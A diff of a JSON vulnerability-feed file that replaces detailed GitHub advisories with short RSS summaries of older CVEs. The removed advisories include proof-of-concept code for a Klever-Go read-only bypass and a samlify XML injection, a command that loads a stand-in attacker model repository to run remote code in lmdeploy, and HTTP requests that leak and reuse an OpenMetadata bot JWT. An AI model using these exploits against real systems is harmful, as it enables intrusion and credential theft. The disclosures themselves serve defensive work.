@@ -1,290 +1,1675 @@
 {
-  "candidate_count": 10,
+  "candidate_count": 69,
   "candidates": [
     {
-      "canonical_id": "CVE-2026-46403",
-      "composite_confidence": 0.95,
-      "cwe": [
-        "CWE-693"
-      ],
-      "description": "## Publisher note\n\n**Fixed in `v1.7.17`.** Operators running `< v1.7.17` should upgrade. Contract delete and upgrade host-core paths now reject execution when `runtime.ReadOnly()` is true. The invariant is regression-tested for delete, upgrade, storage writes, value transfers, and any VM output field that can later mutate chain state.\n\nPatch commits on `develop`: 333f6ec9, 68b94a40 (merged from private fork associated with the original advisory).\n\nThis advisory was originally filed jointly with a separate P2P throttler DoS finding, now tracked under [GHSA-74m6-4hjp-7226](https://github.com/klever-io/klever-go/security/advisories/GHSA-74m6-4hjp-7226) so each issue receives its own CVE.\n\nThe original disclosure from @LoGGGG240211 follows verbatim, including the embedded proof-of-concept source.\n\n---\n\n# Private Vulnerability Report\n\nRepository: klever-io/klever-go\nReviewed commit: 405d01b0abbf0d3e73b4a990bd7394a01f200dc2\nDisclosure channel: GitHub Private Vulnerability Reporting\nReporter GitHub account: LoGGGG240211\n\n## 2.2 KVM read-only execution can commit contract delete side effects\n\nSeverity            : Medium\nConfidence          : HIGH\nAttack Complexity   : MEDIUM\nPoC Status          : Confirmed\n\n### Description\n\nKVM exposes `ExecuteReadOnlyWithTypedArguments` as a read-only execution mechanism. The hook saves the previous read-only state, sets `runtime.SetReadOnly(true)`, executes the destination context, and then restores the previous read-only state. However, the indirect contract delete and upgrade paths do not reject execution when `runtime.ReadOnly()` is true. As a result, a contract reached through read-only execution can call the production delete hook for a target contract it owns. The delete path appends the target address to `vmOutput.DeletedAccounts`, the output context merges `DeletedAccounts` into the caller output, and the smart contract processor later processes the VM output by deleting accounts listed in that field.\n\nThe root cause is that read-only mode is applied as runtime state, but not enforced by the state-changing delete and upgrade host-core paths. This breaks the expected isolation boundary for workflows that rely on read-only calls to inspect another contract without allowing that callee to produce state-changing VM output.\n\n### Location\n\n1. [baseOps.go, ExecuteReadOnlyWithTypedArguments(), line 2097](https://github.com/klever-io/klever-go/blob/405d01b0abbf0d3e73b4a990bd7394a01f200dc2/kvm/vmhost/vmhooks/baseOps.go#L2097)\n2. [baseOps.go, ExecuteReadOnlyWithTypedArguments(), line 2099](https://github.com/klever-io/klever-go/blob/405d01b0abbf0d3e73b4a990bd7394a01f200dc2/kvm/vmhost/vmhooks/baseOps.go#L2099)\n3. [execution.go, doExecContractDelete(), line 237](https://github.com/klever-io/klever-go/blob/405d01b0abbf0d3e73b4a990bd7394a01f200dc2/kvm/vmhost/hostCore/execution.go#L237)\n4. [execution.go, doExecContractDelete(), line 246](https://github.com/klever-io/klever-go/blob/405d01b0abbf0d3e73b4a990bd7394a01f200dc2/kvm/vmhost/hostCore/execution.go#L246)\n5. [execution.go, executeUpgrade(), line 792](https://github.com/klever-io/klever-go/blob/405d01b0abbf0d3e73b4a990bd7394a01f200dc2/kvm/vmhost/hostCore/execution.go#L792)\n6. [execution.go, executeUpgrade(), line 831](https://github.com/klever-io/klever-go/blob/405d01b0abbf0d3e73b4a990bd7394a01f200dc2/kvm/vmhost/hostCore/execution.go#L831)\n7. [execution.go, executeDelete(), line 839](https://github.com/klever-io/klever-go/blob/405d01b0abbf0d3e73b4a990bd7394a01f200dc2/kvm/vmhost/hostCore/execution.go#L839)\n8. [execution.go, executeDelete(), line 849](https://github.com/klever-io/klever-go/blob/405d01b0abbf0d3e73b4a990bd7394a01f200dc2/kvm/vmhost/hostCore/execution.go#L849)\n9. [output.go, PopMergeActiveState(), line 103](https://github.com/klever-io/klever-go/blob/405d01b0abbf0d3e73b4a990bd7394a01f200dc2/kvm/vmhost/contexts/output.go#L103)\n10. [output.go, mergeVMOutputs(), line 615](https://github.com/klever-io/klever-go/blob/405d01b0abbf0d3e73b4a990bd7394a01f200dc2/kvm/vmhost/contexts/output.go#L615)\n11. [process.go, processVMOutput(), line 755](https://github.com/klever-io/klever-go/blob/405d01b0abbf0d3e73b4a990bd7394a01f200dc2/core/process/smartContract/process.go#L755)\n12. [process.go, processVMOutput(), line 765](https://github.com/klever-io/klever-go/blob/405d01b0abbf0d3e73b4a990bd7394a01f200dc2/core/process/smartContract/process.go#L765)\n\n### Preconditions\n\n1. A contract workflow invokes a callee through KVM read-only execution.\n2. The read-only callee owns, or otherwise satisfies the upgrade/delete permission checks for, the target contract.\n3. The target contract is upgradeable/deletable according to its KVM code metadata.\n4. No node operator privilege, validator role, oracle condition, or block-level timing condition is required.\n\n### Impact\n\nSuccessful exploitation violates KVM read-only isolation and allows state-changing delete side effects to be produced from a read-only nested execution. The PoC demonstrates that `DeletedAccounts` changes from zero entries before execution to one target entry after execution. Practical impact depends on contract workflows that trust read-only calls as non-mutating. In such workflows, an attacker-controlled or untrusted callee could hide delete or upgrade effects behind a read-only call. The delete effect is reversible only through redeployment or state recovery procedures available to the protocol or contract owner.\n\n### Exploit Cost\n\nThe cost is normal KVM smart contract execution gas. No flash loan, collateral, oracle manipulation, or external capital requirement is needed. The attacker must satisfy the contract-level preconditions above.\n\n### Steps to Reproduce\n\n1. Place `poc_kvm_readonly_delete_side_effect_test.go` in an empty directory.\n2. Run the dependency commands listed in the PoC header.\n3. Run `GOTOOLCHAIN=go1.25.9 go test -v poc_kvm_readonly_delete_side_effect_test.go`.\n4. Observe that the parent contract invokes a child contract through `ExecuteReadOnlyWithTypedArguments`.\n5. Observe that the child contract uses the production managed delete hook against a target contract it owns.\n6. Observe that the final VM output contains the target address in `DeletedAccounts` despite the delete action being triggered through read-only execution.\n\n### Proof-of-Concept Result\n\nRunning `GOTOOLCHAIN=go1.25.9 go test -v poc_kvm_readonly_delete_side_effect_test.go` after dependency setup produces the following output. The result confirms that read-only execution commits a delete side effect into VM output.\n\n```text\n# command-line-arguments.test\n/usr/bin/ld: warning: bint-x64-amd64.o: missing .note.GNU-stack section implies executable stack\n/usr/bin/ld: NOTE: This behaviour is deprecated and will be removed in a future version of the linker\n=== RUN   TestPoC_KVMReadOnlyCanCommitDeleteSideEffect\n    poc_kvm_readonly_delete_side_effect_test.go:90: deleted_accounts_before=0\n    poc_kvm_readonly_delete_side_effect_test.go:91: deleted_accounts_after=1\n    poc_kvm_readonly_delete_side_effect_test.go:92: target_deleted=true\n--- PASS: TestPoC_KVMReadOnlyCanCommitDeleteSideEffect (0.00s)\nPASS\nok  \tcommand-line-arguments\t0.007s\n```\n\n### Suggested Fix\n\nEnforce read-only mode in every state-changing KVM host path. At minimum, reject contract delete and contract upgrade execution when `runtime.ReadOnly()` is true. The same invariant should be regression-tested for delete, upgrade, storage writes, value transfers, and any VM output field that can later mutate chain state.\n\n## Proof-of-Concept Source\n\n### poc_kvm_readonly_delete_side_effect_test.go\n\n```go\npackage poc\n\n/*\nTarget contract   : Klever-Go KVM VM host hooks and smart contract processor; no on-chain address\nVulnerability     : Read-only execution isolation bypass with contract delete side effect\nSeverity          : Medium\nHow to run        : GOTOOLCHAIN=go1.25.9 go test -v poc_kvm_readonly_delete_side_effect_test.go\nExpected output   : The test passes and logs deleted_accounts_after=1 and target_deleted=true\nDependencies      : In an empty directory containing this file, run: go mod init klever-go-disclosure-poc; go get github.com/klever-io/klever-go@v1.7.17-0.20260422114731-405d01b0abbf; go get github.com/stretchr/testify@v1.11.1; go mod tidy\n*/\n\nimport (\n\t\"testing\"\n\n\tcontextmock \"github.com/klever-io/klever-go/kvm/mock/context\"\n\tworldmock \"github.com/klever-io/klever-go/kvm/mock/world\"\n\ttest \"github.com/klever-io/klever-go/kvm/testcommon\"\n\t\"github.com/klever-io/klever-go/kvm/vmhost/vmhooks\"\n\t\"github.com/klever-io/klever-go/vmcommon\"\n\t\"github.com/stretchr/testify/require\"\n)\n\nfunc TestPoC_KVMReadOnlyCanCommitDeleteSideEffect(t *testing.T) {\n\t// Build a production-relevant KVM setup with a parent contract, a child contract, and a target contract.\n\ttargetAddress := test.MakeTestSCAddressWithDefaultVM(\"readonlyTarget\")\n\n\t// Record the initial delete side-effect state before any read-only execution occurs.\n\tdeletedBefore := make([][]byte, 0)\n\trequire.NotContains(t, deletedBefore, targetAddress)\n\n\tvmOutput, err := test.BuildMockInstanceCallTest(t).\n\t\tWithContracts(\n\t\t\t// The parent contract models the transaction entrypoint controlled by a user or contract workflow.\n\t\t\ttest.CreateMockContract(test.ParentAddress).\n\t\t\t\tWithMethods(func(parentInstance *contextmock.InstanceMock, _ interface{}) {\n\t\t\t\t\tparentInstance.AddMockMethod(\"callReadOnlyChild\", func() *contextmock.InstanceMock {\n\t\t\t\t\t\thost := parentInstance.Host\n\n\t\t\t\t\t\t// The parent invokes the child through ExecuteReadOnly, which should not commit state effects.\n\t\t\t\t\t\tresult := vmhooks.ExecuteReadOnlyWithTypedArguments(\n\t\t\t\t\t\t\thost,\n\t\t\t\t\t\t\t100000,\n\t\t\t\t\t\t\t[]byte(\"deleteTarget\"),\n\t\t\t\t\t\t\ttest.ChildAddress,\n\t\t\t\t\t\t\tnil,\n\t\t\t\t\t\t)\n\t\t\t\t\t\trequire.Equal(t, int32(0), result)\n\n\t\t\t\t\t\treturn parentInstance\n\t\t\t\t\t})\n\t\t\t\t}),\n\t\t\t// The child contract is called in read-only mode but attempts to delete a contract it owns.\n\t\t\ttest.CreateMockContract(test.ChildAddress).\n\t\t\t\tWithMethods(func(childInstance *contextmock.InstanceMock, _ interface{}) {\n\t\t\t\t\tchildInstance.AddMockMethod(\"deleteTarget\", func() *contextmock.InstanceMock {\n\t\t\t\t\t\thost := childInstance.Host\n\t\t\t\t\t\tmanagedTypes := host.ManagedTypes()\n\n\t\t\t\t\t\t// Encode the target address and call the production ManagedDeleteContract hook.\n\t\t\t\t\t\tdestHandle := managedTypes.NewManagedBufferFromBytes(targetAddress)\n\t\t\t\t\t\targsHandle := managedTypes.NewManagedBuffer()\n\t\t\t\t\t\tmanagedTypes.WriteManagedVecOfManagedBuffers(nil, argsHandle)\n\n\t\t\t\t\t\tvmhooks.ManagedDeleteContractWithHost(host, destHandle, 100000, argsHandle)\n\n\t\t\t\t\t\treturn childInstance\n\t\t\t\t\t})\n\t\t\t\t}),\n\t\t\t// The target contract is upgradeable/deletable and owned by the read-only child.\n\t\t\ttest.CreateMockContract(targetAddress).\n\t\t\t\tWithCodeMetadata([]byte{vmcommon.MetadataUpgradeable, 0}).\n\t\t\t\tWithOwnerAddress(test.ChildAddress).\n\t\t\t\tWithMethods(),\n\t\t).\n\t\t// Execute only the parent entrypoint; the delete action is hidden behind ExecuteReadOnly.\n\t\tWithInput(test.CreateTestContractCallInputBuilder().\n\t\t\tWithRecipientAddr(test.ParentAddress).\n\t\t\tWithGasProvided(500000).\n\t\t\tWithFunction(\"callReadOnlyChild\").\n\t\t\tBuild()).\n\t\tAndAssertResults(func(_ *worldmock.MockWorld, _ *test.VMOutputVerifier) {})\n\n\trequire.NoError(t, err)\n\n\t// The read-only nested call must not create delete side effects, but the vulnerable implementation does.\n\tdeletedAfter := vmOutput.DeletedAccounts\n\trequire.Greater(t, len(deletedAfter), len(deletedBefore))\n\trequire.Contains(t, deletedAfter, targetAddress)\n\n\tt.Logf(\"deleted_accounts_before=%d\", len(deletedBefore))\n\tt.Logf(\"deleted_accounts_after=%d\", len(deletedAfter))\n\tt.Logf(\"target_deleted=%t\", true)\n}\n```",
-      "first_seen": "2026-05-21T19:07:38.169555+00:00",
+      "canonical_id": "CVE-2017-18362",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[huntress] A vulnerability was discovered and disclosed in late 2017 that affected the ConnectWise ManagedITSync integration, designed to sync data between the ConnectWise Manage PSA and the Kaseya VSA RMM.",
+      "first_seen": "2026-05-21T20:08:57.678897+00:00",
       "frameworks": [
-        "go"
+        "huntress"
       ],
       "key_kind": "cve",
       "languages": [],
-      "last_seen": "2026-05-21T19:07:38.169555+00:00",
+      "last_seen": "2026-05-21T20:08:57.678897+00:00",
       "merged_sources": [
-        "ghsa"
+        "rss_feeds"
       ],
-      "proactive_only": false,
+      "proactive_only": true,
       "raw_records_count": 1,
       "references": [
-        "https://github.com/advisories/GHSA-jc6w-wmfc-fh33",
-        "https://github.com/klever-io/klever-go/commit/333f6ec910906e227705fc5767dc897d8fbfc862",
-        "https://github.com/klever-io/klever-go/commit/68b94a40824fac2d848a4ded6eb7c91ada6ce9ef",
-        "https://github.com/klever-io/klever-go/security/advisories/GHSA-jc6w-wmfc-fh33"
+        "https://www.huntress.com/blog/cve-2017-18362-arbitrary-sql-injection-in-mangeditsync-integration-ba142ff24f4d"
       ],
       "severity": "medium",
       "source_count": 1,
-      "title": "Klever-Go KVM read-only execution can commit contract delete and upgrade side effects"
+      "title": "CVE-2017-18362: SQL Injection in ManagedITSync Integration | Huntress"
     },
     {
-      "canonical_id": "CVE-2026-46432",
-      "composite_confidence": 0.95,
-      "cwe": [
-        "CWE-94"
-      ],
-      "description": "## Summary\n\nlmdeploy hardcodes `trust_remote_code=True` in multiple HuggingFace model-loading call sites.\n\nThe affected code paths are in:\n\n```text\nlmdeploy/archs.py\nlmdeploy/utils.py\n````\n\nThe vulnerable call sites pass `trust_remote_code=True` into HuggingFace Transformers APIs such as `AutoConfig.from_pretrained()`, `PretrainedConfig.get_config_dict()`, and `GenerationConfig.from_pretrained()`.\n\nBecause the model path is supplied by the operator or deployment configuration, an attacker who can control the `model_path` used by an lmdeploy serving process can point it to an attacker-controlled HuggingFace model repository. When lmdeploy starts and initializes the model, Transformers may download and execute remote Python code from that repository.\n\nSuccessful exploitation results in arbitrary code execution with the privileges of the lmdeploy serving process.\n\n## Affected version\n\nConfirmed affected:\n\n```text\nlmdeploy <= 0.12.3\n```\n\nThe issue was verified on `v0.12.3` and on `main`.\n\n## Vulnerable code\n\nConfirmed call sites:\n\n```text\nlmdeploy/archs.py:154\nAutoConfig.from_pretrained(..., trust_remote_code=True)\n\nlmdeploy/archs.py:157\nPretrainedConfig.get_config_dict(..., trust_remote_code=True)\n\nlmdeploy/utils.py:225\nGenerationConfig.from_pretrained(..., trust_remote_code=True)\n```\n\nThe vulnerable pattern is:\n\n```python\nAutoConfig.from_pretrained(model_path, trust_remote_code=True)\n```\n\nand:\n\n```python\nGenerationConfig.from_pretrained(path, trust_remote_code=True)\n```\n\nThe risk is that `trust_remote_code=True` is enabled unconditionally. Users are not required to explicitly opt in through a CLI flag or configuration option.\n\n## Attack scenario\n\n1. An attacker obtains the ability to control or modify the model path used by an lmdeploy deployment. Examples include deployment configuration access, CI/CD configuration access, Kubernetes or container configuration access, or a managed environment where users can submit model IDs for serving.\n2. The attacker sets the model path to an attacker-controlled HuggingFace repository, for example:\n\n```text\nattacker-org/malicious-model\n```\n\n3. The lmdeploy serving process starts with that model path:\n\n```bash\nlmdeploy serve api_server attacker-org/malicious-model\n```\n\n4. During model initialization, lmdeploy calls HuggingFace Transformers APIs with `trust_remote_code=True`.\n5. Transformers loads and executes remote Python code from the attacker-controlled model repository.\n6. The payload runs with the privileges of the lmdeploy serving process.\n\n## Why this is security-sensitive\n\n`trust_remote_code=True` is a dangerous HuggingFace option because it allows model repositories to execute custom Python code during model loading.\n\nIn lmdeploy, this option is hardcoded at multiple call sites. This removes the explicit trust decision from the user or deployment operator. A safer design would require an explicit CLI flag or configuration option such as `--trust-remote-code`.\n\nlmdeploy is commonly used as a model serving daemon. The serving process may have access to model weights, GPU resources, API credentials, cloud credentials, request data, and internal network resources.\n\n## Proof of concept\n\nThe following PoC demonstrates the vulnerable primitive in a local, non-destructive way. It simulates lmdeploy calling a HuggingFace model-loading path with `trust_remote_code=True` and shows that remote model code would execute during initialization.\n\n```python\n#!/usr/bin/env python3\nfrom __future__ import annotations\n\nimport argparse\nimport importlib.util\nimport os\nimport sys\nimport tempfile\nfrom pathlib import Path\n\nMARKER = Path(\"/tmp/LMDEPLOY_TRUST_REMOTE_CODE_RCE_PROOF\")\nMALICIOUS_MODEL = \"attacker-org/malicious-model\"\n\n\ndef simulate_lmdeploy_model_load(model_path: str) -> None:\n    \"\"\"\n    Simulates lmdeploy model initialization where trust_remote_code=True is hardcoded.\n\n    Real vulnerable pattern:\n        AutoConfig.from_pretrained(model_path, trust_remote_code=True)\n        GenerationConfig.from_pretrained(path, trust_remote_code=True)\n\n    When trust_remote_code=True, a malicious HuggingFace model repository can\n    execute custom Python code during loading.\n    \"\"\"\n\n    fake_model_dir = Path(tempfile.mkdtemp(prefix=\"fake_lmdeploy_model_\"))\n    module_name = model_path.split(\"/\")[-1].replace(\"-\", \"_\")\n    modeling_file = fake_model_dir / f\"modeling_{module_name}.py\"\n\n    payload = f'''\nimport os\nfrom pathlib import Path\n\nPath(\"{MARKER}\").write_text(\n    \"lmdeploy trust_remote_code execution confirmed\\\\n\"\n    f\"model_path={model_path!r}\\\\n\"\n    f\"pid={{os.getpid()}} euid={{os.geteuid()}}\\\\n\"\n)\n'''\n    modeling_file.write_text(payload)\n\n    spec = importlib.util.spec_from_file_location(f\"modeling_{module_name}\", modeling_file)\n    assert spec is not None and spec.loader is not None\n\n    mod = importlib.util.module_from_spec(spec)\n    spec.loader.exec_module(mod)\n\n\ndef main() -> int:\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"--model-id\", default=MALICIOUS_MODEL)\n    args = parser.parse_args()\n\n    if MARKER.exists():\n        MARKER.unlink()\n\n    print(f\"[*] Simulating lmdeploy loading model: {args.model_id}\")\n    print(\"[*] trust_remote_code=True is hardcoded in lmdeploy model-loading paths\")\n\n    simulate_lmdeploy_model_load(args.model_id)\n\n    if MARKER.exists():\n        print(\"[+] Code execution confirmed\")\n        print(MARKER.read_text())\n        return 0\n\n    print(\"[-] Marker file was not created\", file=sys.stderr)\n    return 1\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n```\n\nExpected result:\n\n```text\n[+] Code execution confirmed\n```\n\nThe marker file is written to:\n\n```text\n/tmp/LMDEPLOY_TRUST_REMOTE_CODE_RCE_PROOF\n```\n\n## Impact\n\nAn attacker who can control the model path used by an lmdeploy deployment can execute arbitrary Python code during model initialization.\n\nThe attacker may be able to:\n\n* Read files accessible to the lmdeploy process.\n* Access environment variables, model provider credentials, HuggingFace tokens, cloud credentials, and API keys.\n* Modify model-serving behavior or tamper with responses.\n* Execute arbitrary operating-system commands.\n* Access request data or internal service credentials available to the serving process.\n* Cause denial of service by crashing or destabilizing the serving daemon.\n* Pivot to internal services reachable from the lmdeploy host or container.",
-      "first_seen": "2026-05-21T19:07:38.169310+00:00",
+      "canonical_id": "CVE-2018-1002105",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[snyk] An examination of the critical Kubernetes vulnerability identified as CVE-2018-1002105, which allows an attacker to gain remote access to backend services that reside in the Kubernetes cluster and execute arbitrary commands on them. We look at key takeaways and methods for protecting yourself from image vulnerabilities.",
+      "first_seen": "2026-05-21T20:09:05.750537+00:00",
       "frameworks": [
-        "pip"
+        "snyk"
       ],
       "key_kind": "cve",
       "languages": [],
-      "last_seen": "2026-05-21T19:07:38.169310+00:00",
+      "last_seen": "2026-05-21T20:09:05.750537+00:00",
       "merged_sources": [
-        "ghsa"
+        "rss_feeds"
       ],
-      "proactive_only": false,
+      "proactive_only": true,
       "raw_records_count": 1,
       "references": [
-        "https://github.com/InternLM/lmdeploy/pull/4511",
-        "https://github.com/InternLM/lmdeploy/security/advisories/GHSA-m549-qq94-fvhg",
-        "https://github.com/advisories/GHSA-m549-qq94-fvhg"
-      ],
-      "severity": "high",
-      "source_count": 1,
-      "title": "LMDeploy: Arbitrary code execution via hardcoded trust_remote_code=True in lmdeploy model initialization"
-    },
-    {
-      "canonical_id": "CVE-2026-46481",
-      "composite_confidence": 0.95,
-      "cwe": [
-        "CWE-201"
-      ],
-      "description": "**This is not applicable if an application is configuring the Secrets Store to store credentials. Please make sure to follow the best practices when deploying in production**\nIn OpenMetadata 1.12.1, a non-admin SSO user can trigger a `TEST_CONNECTION` workflow for a Database Service and receive, in the HTTP 201 response of `POST /api/v1/automations/workflows`, both:\n\n- The cleartext database password in `request.connection.config.password`.\n- The ingestion bot JWT in `openMetadataServerConnection.securityConfig.jwtToken`.\n\nThe leaked ingestion-bot token can then be reused as `Authorization: Bearer <jwt>` to access sensitive service APIs (for example, `GET /api/v1/services/databaseServices/{id}?include=all`) with bot-level privileges.\n\nThis looks different from GHSA-pqqf-7hxm-rj5r, because it affects the `automations/workflows` TEST_CONNECTION endpoint on OpenMetadata 1.12.1, not the ingestion pipelines endpoints.\n\n---\n\nVersion / Product\n\n- Product: OpenMetadata (open source, Apache 2.0)\n- Version: 1.12.1\n  - GET /api/v1/system/version \u2192\n    {\"version\":\"1.12.1\",\"revision\":\"618a2dc2ec8f70ffcd0378ee14ce92cb4f98f0c5\"}\n- Deployment: OpenMetadata server with SSO via Azure AD (OAuth), Oracle database service, secrets in DB secrets manager (`secretsManagerProvider: \"db\"`).\n\n---\n\nPreconditions\n\n- Authenticated SSO user with access to the UI.\n- User can open a Database Service and click \u201cTest connection\u201d.\n- No server admin role, no shell/DB access.\n\n---\n\nPoC (short)\n\n1) Login as a regular SSO user.\n\n2) In the UI go to:\n   Settings \u2192 Services \u2192 Database Services \u2192 utplrac_scan2_srvetel  \n   Open the connection tab and click \u201cTest connection\u201d.\n\n3) The browser sends:\n\nPOST /api/v1/automations/workflows HTTP/1.1\nHost: catalogodatos-test.utpl.edu.ec\nAuthorization: Bearer <Azure_AD_user_JWT>\nContent-Type: application/json\n\n{\n  \"name\": \"test-connection-Oracle-XXXX\",\n  \"workflowType\": \"TEST_CONNECTION\",\n  \"request\": {\n    \"connection\": {\n      \"config\": {\n        \"type\": \"Oracle\",\n        \"scheme\": \"oracle+cx_oracle\",\n        \"username\": \"qpro_gobierno_datos\",\n        \"password\": \"********\",\n        \"hostPort\": \"172.16.54.32:1521\",\n        ...\n      }\n    },\n    \"serviceType\": \"Database\",\n    \"connectionType\": \"Oracle\",\n    \"serviceName\": \"utplrac_scan2_srvetel\"\n  }\n}\n\nNote: in the request the password is masked as \"********\".\n\n4) The server responds with HTTP 201 and a body similar to:\n\n{\n  \"id\": \"5acd06f0-0db6-43b9-b0e0-e1574479bba7\",\n  \"workflowType\": \"TEST_CONNECTION\",\n  \"request\": {\n    \"connection\": {\n      \"config\": {\n        \"type\": \"Oracle\",\n        \"scheme\": \"oracle+cx_oracle\",\n        \"username\": \"qpro_gobierno_datos\",\n        \"password\": \"<REAL_PASSWORD_HERE>\",\n        \"hostPort\": \"172.16.54.32:1521\",\n        ...\n      }\n    },\n    \"serviceType\": \"Database\",\n    \"connectionType\": \"Oracle\",\n    \"serviceName\": \"utplrac_scan2_srvetel\",\n    \"secretsManagerProvider\": \"db\"\n  },\n  \"openMetadataServerConnection\": {\n    \"type\": \"OpenMetadata\",\n    \"hostPort\": \"http://openmetadata-server:8585/api\",\n    \"authProvider\": \"openmetadata\",\n    \"securityConfig\": {\n      \"jwtToken\": \"eyJraWQiOiJHYjM4OWEtOWY3Ni1nZGpzLWE5MmotMDI0MmJrOTQzNTYiLCJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJvcGVuLW1ldGFkYXRhLm9yZyIsInN1YiI6ImluZ2VzdGlvbi1ib3QiLCJyb2xlcyI6WyJJbmdlc3Rpb25Cb3RSb2xlIl0sImVtYWlsIjoiaW5nZXN0aW9uLWJvdEBvcGVuLW1ldGFkYXRhLm9yZyIsImlzQm90Ijp0cnVlLCJ0b2tlblR5cGUiOiJCT1QiLCJ1c2VybmFtZSI6ImluZ2VzdGlvbi1ib3QiLCJwcmVmZXJyZWRfdXNlcm5hbWUiOiJpbmdlc3Rpb24tYm90IiwiaWF0IjoxNzc0MDI2Nzg3LCJleHAiOjE3ODE4MDI3ODd9.DHLw4s...\"\n    },\n    ...\n  },\n  \"updatedBy\": \"<regular_user>\",\n  ...\n}\n\nKey points:\n- request.connection.config.password now contains the real Oracle DB password in cleartext.\n- openMetadataServerConnection.securityConfig.jwtToken contains a valid JWT for the ingestion-bot account (sub = \"ingestion-bot\", tokenType = \"BOT\").\n\n5) Reuse the leaked ingestion-bot JWT:\n\nGET /api/v1/services/databaseServices/f0382c0b-149e-4ca5-8844-d636c3437b9d?include=all HTTP/1.1\nHost: catalogodatos-test.utpl.edu.ec\nAuthorization: Bearer <leaked_ingestion-bot_JWT>\nAccept: application/json\n\nThe API returns the full database service including username and password, confirming bot-level access.\n\n---\n\nImpact / Severity\n\n- Any user who can run \u201cTest connection\u201d on a database service can:\n  - Recover the cleartext DB credentials.\n  - Recover a long\u2011lived ingestion-bot JWT.\n  - Act as ingestion-bot against the OpenMetadata API and access/modify services and metadata.\n\n**\n<img width=\"1256\" height=\"653\" alt=\"LOWLEVELTOKEN\" src=\"https://github.com/user-attachments/assets/e5b45edb-be51-493a-b4d0-25175cdf7cbc\" />\n<img width=\"194\" height=\"339\" alt=\"USERROL\" src=\"https://github.com/user-attachments/assets/04005616-4c7b-4b27-90f6-a8e1a974712b\" />\n<img width=\"972\" height=\"389\" alt=\"CLEARPOC\" src=\"https://github.com/user-attachments/assets/fdb26b59-782e-4a6b-a595-cdfb7ea68984\" />**",
-      "first_seen": "2026-05-21T19:07:38.169706+00:00",
-      "frameworks": [
-        "maven"
-      ],
-      "key_kind": "cve",
-      "languages": [],
-      "last_seen": "2026-05-21T19:07:38.169706+00:00",
-      "merged_sources": [
-        "ghsa"
-      ],
-      "proactive_only": false,
-      "raw_records_count": 1,
-      "references": [
-        "https://github.com/advisories/GHSA-9vmh-whc4-7phg",
-        "https://github.com/open-metadata/OpenMetadata/security/advisories/GHSA-9vmh-whc4-7phg"
-      ],
-      "severity": "high",
-      "source_count": 1,
-      "title": "OpenMetadata: TEST_CONNECTION workflow leaks ingestion-bot JWT and database password to regular users"
-    },
-    {
-      "canonical_id": "CVE-2026-46486",
-      "composite_confidence": 0.95,
-      "cwe": [
-        "CWE-22"
-      ],
-      "description": "### Summary\n\nThe `fileID` field from `Manifest.db` (a SQLite database inside iOS backups, generated by the device) is used directly in filesystem path construction without validation. This affects two commands through a shared code path:\n\n- **`mvt-ios decrypt-backup`** (`decrypt.py`): `file_id` is used to construct both read source and write destination paths. Traversal sequences in `file_id` cause decrypted content to be written to an arbitrary location on the analyst's filesystem.\n- **`mvt-ios check-backup`** (via `_get_backup_file_from_id()` in `ios/modules/base.py`): the same unvalidated `fileID` resolves to files outside the backup directory, which are then opened and parsed. Parsed contents flow into JSON results and CSV timeline.\n\n### Impact\n\n**File write (decrypt-backup):** An adversary delivering a crafted iOS backup can cause attacker controlled content to be written to arbitrary paths writable by the analyst process. This could be leveraged for code execution via shell profile modification or SSH key injection. Severity is assessed as Moderate because exploitation requires a specifically crafted malicious bundle to be parsed by the\nanalyst. There are trust mitigations between stakeholders involved in the handoff of the sample that reduce the likelihood of this scenario.\n\n**File read (check-backup):** An adversary can force MVT to open and parse files outside the backup directory. Practical exploitation is reduced as it requires the attacker to know or guess the analyst\u2019s directory layout for cross-case targeting, and the traversed file from the host must be a valid SQLite database or plist whose schema matches what the specific MVT module expects.\n\n### Patched version\n[2026.5.12](https://github.com/mvt-project/mvt/releases/tag/v2026.5.12)\n\n### Credits\nThis issue was identified during a security assessment conducted by 0xche.",
-      "first_seen": "2026-05-21T19:07:38.169507+00:00",
-      "frameworks": [
-        "pip"
-      ],
-      "key_kind": "cve",
-      "languages": [],
-      "last_seen": "2026-05-21T19:07:38.169507+00:00",
-      "merged_sources": [
-        "ghsa"
-      ],
-      "proactive_only": false,
-      "raw_records_count": 1,
-      "references": [
-        "https://github.com/advisories/GHSA-5h3g-px23-w6vw",
-        "https://github.com/mvt-project/mvt/releases/tag/v2026.5.12",
-        "https://github.com/mvt-project/mvt/security/advisories/GHSA-5h3g-px23-w6vw"
+        "https://snyk.io/blog/critical-arbitrary-code-execution-vulnerability-found-in-kubernetes/"
       ],
       "severity": "medium",
       "source_count": 1,
-      "title": "Mobile Verification Toolkit (MVT): Path Traversal via unsanitized File identifiers in iOS Backup processing"
+      "title": "Critical Arbitrary Code Execution Vulnerability Found in Kubernetes"
     },
     {
-      "canonical_id": "CVE-2026-46490",
-      "composite_confidence": 0.95,
-      "cwe": [
-        "CWE-91"
-      ],
-      "description": "## Summary\n\nsamlify\u2019s template substitution only escapes attribute contexts. Values inserted into element text (e.g., `<saml:AttributeValue>`) are not escaped. A normal user can inject XML markup into an attribute value (e.g., email, name) and add new `<saml:Attribute>` elements inside the signed assertion. The IdP then signs the tampered assertion and the SP accepts the injected attributes as trusted. This allows privilege escalation when attributes are used for authorization (roles/groups).\n\n## Root Cause\n\n`src/libsaml.ts` \u2192 `replaceTagsByValue()` only escapes placeholders when preceded by a quote (attribute context). Element text is inserted raw. The attribute builder inserts placeholders into element text:\n\n```\n<saml:AttributeValue ...>{attrUserX}</saml:AttributeValue>\n```\n\nTherefore, `</saml:AttributeValue>\u2026<saml:Attribute \u2026>` is accepted and signed.\n\n## Proof-of-concept\n\n- poc/attribute_injection.ts\n\n```TS\nimport { readFileSync } from 'fs';\nimport * as samlify from '../index';\nimport * as validator from '@authenio/samlify-xsd-schema-validator';\n\nsamlify.setSchemaValidator(validator);\n\nconst { IdentityProvider, ServiceProvider, SamlLib: libsaml, Utility: util } = samlify as any;\n\nconst loginResponseTemplate = {\n  context: '<samlp:Response xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\" xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" ID=\"{ID}\" Version=\"2.0\" IssueInstant=\"{IssueInstant}\" Destination=\"{Destination}\" InResponseTo=\"{InResponseTo}\"><saml:Issuer>{Issuer}</saml:Issuer><samlp:Status><samlp:StatusCode 